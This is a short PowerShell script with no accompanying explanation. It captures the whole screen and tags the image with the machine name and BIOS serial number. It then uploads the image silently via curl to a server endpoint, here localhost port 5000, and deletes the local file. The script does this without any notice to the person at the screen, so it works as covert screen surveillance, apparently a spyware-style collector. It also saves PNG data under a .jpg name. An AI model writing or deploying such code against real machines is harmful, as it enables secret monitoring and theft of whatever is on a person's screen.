Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$device_id = "$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$filename = "${device_id}_${timestamp}.jpg"
$Fileto = "$env:temp\$filename"
$width = Get-CimInstance Win32_VideoController
$width = [int]($width).CurrentHorizontalResolution
$height = Get-CimInstance Win32_VideoController
$height = [int]($height).CurrentVerticalResolution
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$bitmap.Save($Fileto, [System.Drawing.Imaging.ImageFormat]::png)
curl.exe -s -o nul -F "device_id=$device_id" -F "file=@$Fileto;filename=$filename" http://127.0.0.1:5000/upload | Out-Null
Remove-Item $Fileto